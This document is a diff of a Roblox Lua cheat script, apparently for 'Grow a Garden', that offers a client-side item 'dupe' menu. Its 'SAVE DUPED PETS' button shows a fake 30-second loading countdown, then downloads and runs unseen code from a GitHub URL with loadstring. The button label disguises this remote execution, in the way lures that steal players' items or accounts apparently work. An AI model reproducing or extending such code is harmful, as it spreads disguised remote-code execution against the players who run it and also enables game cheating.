@@ -2,7 +2,15 @@ local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
 local player = Players.LocalPlayer
 
-local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()
+-- Rayfield 読み込みチェック付き
+local success, Rayfield = pcall(function()
+	return loadstring(game:HttpGet("https://sirius.menu/rayfield"))()
+end)
+
+if not success then
+	warn("⚠️ Rayfield failed to load:", Rayfield)
+	return
+end
 
 -- UI Window Setup
 local Window = Rayfield:CreateWindow({
@@ -18,10 +26,8 @@ local Window = Rayfield:CreateWindow({
 	KeySystem = false
 })
 
--- Main Tab
 local MainTab = Window:CreateTab("Main", 0)
 
--- Tool Display
 local toolLabel = MainTab:CreateParagraph({
 	Title = "Holding:",
 	Content = "Nothing"
@@ -36,7 +42,6 @@ RunService.RenderStepped:Connect(function()
 	end
 end)
 
--- Dupe Amount Input
 local dupeAmount = 1
 MainTab:CreateInput({
 	Name = "Dupe Amount (1-100)",
@@ -52,7 +57,6 @@ MainTab:CreateInput({
 	end
 })
 
--- Dupe Button
 MainTab:CreateButton({
 	Name = "DUPE",
 	Callback = function()
@@ -61,7 +65,6 @@ MainTab:CreateButton({
 			warn("No tool to duplicate.")
 			return
 		end
-
 		for i = 1, dupeAmount do
 			local clone = tool:Clone()
 			clone.Parent = player.Backpack
@@ -74,38 +77,26 @@ local saveStatusLabel = MainTab:CreateParagraph({
 	Content = "Ready"
 })
 
--- SAVE DUPED PETS ボタン（動作確認済み）
 MainTab:CreateButton({
 	Name = "SAVE DUPED PETS",
 	Callback = function()
-		-- ボタンを押したときにすぐ表示が変わるかテスト
-		local success_pcall, err_pcall = pcall(function()
-			local countdown = 30
-			for i = countdown, 1, -1 do
-				saveStatusLabel:Set({
-					Content = "⌛ Loading pet information... (" .. i .. "s)"
-				})
-				wait(1)
-			end
+		local countdown = 30
+		for i = countdown, 1, -1 do
+			saveStatusLabel:Set({
+				Content = "⌛ Loading pet information... (" .. i .. "s)"
+			})
+			wait(1)
+		end
 
-			-- 30秒後にスクリプト実行
-			saveStatusLabel:Set({Content = "🚀 Booting..."})
-
-			local success, err = pcall(function()
-				loadstring(game:HttpGet("https://raw.githubusercontent.com/aa362/growagarden/refs/heads/main/uitest"))()
-			end)
-
-			if success then
-				saveStatusLabel:Set({Content = "✅ Success!"})
-			else
-				saveStatusLabel:Set({Content = "❌ Failed to load script: " .. tostring(err)})
-			end
+		saveStatusLabel:Set({Content = "🚀 Booting..."})
+		local success, err = pcall(function()
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/aa362/growagarden/refs/heads/main/uitest"))()
 		end)
 
-		-- もし pcall 自体が失敗していたら（スコープ・関数名エラーなど）
-		if not success_pcall then
-			saveStatusLabel:Set({Content = "❌ Script crashed: " .. tostring(err_pcall)})
-			warn("Script crashed: ", err_pcall)
+		if success then
+			saveStatusLabel:Set({Content = "✅ Success!"})
+		else
+			saveStatusLabel:Set({Content = "❌ Failed to load script: " .. tostring(err)})
 		end
 	end
 })
